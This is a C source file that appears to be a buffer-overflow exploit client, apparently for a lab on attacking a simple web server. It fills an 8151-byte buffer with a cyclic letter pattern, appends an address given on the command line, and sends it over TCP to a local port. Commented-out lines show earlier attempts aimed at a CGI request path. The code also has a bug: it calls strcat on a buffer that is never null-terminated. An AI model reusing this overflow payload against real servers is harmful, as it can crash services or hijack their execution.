#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>        
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>
#define LETHAL_SIZE 8192
#define NONLETHAL_SIZE 4000

void delay(int sec);

int main(int argc, char **argv){
	if(argc != 3){
		fprintf(stderr, "usage: %s <port> <addr>\n", argv[0]);
		exit(0);
	}
	//int64_t addr = atoi(argv[2]);
	char * addr = argv[2];
	int port = atoi(argv[1]);
	int socket_id;
	struct sockaddr_in server;
	ssize_t payload_id;
	//char payload[SIZE];
	int ch = 65;
	int count = 315;
	char *lethal =  (char *) malloc(LETHAL_SIZE*sizeof(char));
	int there = 0;
	for(int i = 0; i<LETHAL_SIZE; i++){ //every 315 switch A= 65
		if(count-- > 0 && !there){
			char character = (char)ch;
			lethal[i] = character;
		}else if(!there){
			count = 315;
			ch++;
			char character = (char)ch;
			lethal[i] = character;
		}
		if(i == 8151){
			break;
			there = 1;
		}
		// if(there){
		// 	ch = 90;
		// 	char character = (char)ch;
		// 	lethal[i] = character;
		// }
	}
	strcat(lethal, addr);
	// char *nonlethal = (char *) malloc(NONLETHAL_SIZE*sizeof(char));
	// for(int i = 0; i<NONLETHAL_SIZE; i++){
	// 	nonlethal[i] = *"0";
	// }
	//printf("sizeof lethal: %ld\n", sizeof(lethal));
	socket_id = socket(AF_INET, SOCK_STREAM, 0);
	if(socket_id == -1){
		perror("Socket failed\n");
		exit(0);
	}

	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	if(connect(socket_id, (struct sockaddr *) &server, sizeof(server)) == -1){
		perror("Connection failed\n");
		exit(0);
	}
	//8192 + 
	//strcpy(payload, "GET /cgi-bin/adde1111111111111222222222222222"); //GET /cgi-bin/adder?1111111111111222222222222222
	//strcpy(payload, "GET ");
	//strcat(payload, lethal);
	//strcat(payload, lethal);
	//printf("Sizeof payload: %ld\n", sizeof(payload));
	// printf("%s\n", payload);

	payload_id = send(socket_id,lethal,strlen(lethal),0);
	if(payload_id < 0){
		perror("Failed to send payload\n");
		exit(0);
	}


	// payload_id = send(socket_id,nonlethal,strlen(nonlethal),0);
	// if(payload_id < 0){
	// 	perror("Failed to send payload\n");
	// 	exit(0);
	// }
	// printf("close code: %d\n",close(socket_id));
	// return 0;
	//delay(1);

	// strcpy(payload, "GET /godzilla.jpg");
	// payload_id = send(socket_id,payload,strlen(payload),0);
	// if(payload_id < 0){
	// 	perror("Failed to send payload\n");
	// 	exit(0);
	// }
	// delay(1);

	// int c = 2;
	// strcpy(payload, "\r\n");
	// while(c--){
	// 	payload_id = send(socket_id,payload,strlen(payload),0);
	// 	if(payload_id < 0){
	// 		perror("Failed to send payload\n");
	// 		exit(0);
	// 	}
	// }

	// int c = 500;
	// strcpy(payload, "continue?");
	// while(c--){
	// 	payload_id = send(socket_id,payload,strlen(payload),0);
	// 	if(payload_id < 0){
	// 		perror("Failed to send payload\n");
	// 		exit(0);
	// 	}
	// }

	// c = 500;
	// strcpy(payload, "another?");
	// while(c--){
	// 	payload_id = send(socket_id,payload,strlen(payload),0);
	// 	if(payload_id < 0){
	// 		perror("Failed to send final payload\n");
	// 		exit(0);
	// 	}
	// }
	// delay(1);

	// c = 2;
	// while(c--){
	// 	payload_id = send(socket_id,lethal,strlen(lethal),0);
	// 	if(payload_id < 0){
	// 		perror("Failed to send payload\n");
	// 		exit(0);
	// 	}
	// }
	free(lethal);
}

void delay(int sec){
	int mil = 1000000*sec;
	clock_t start = clock();
	while(clock()<start+mil);
}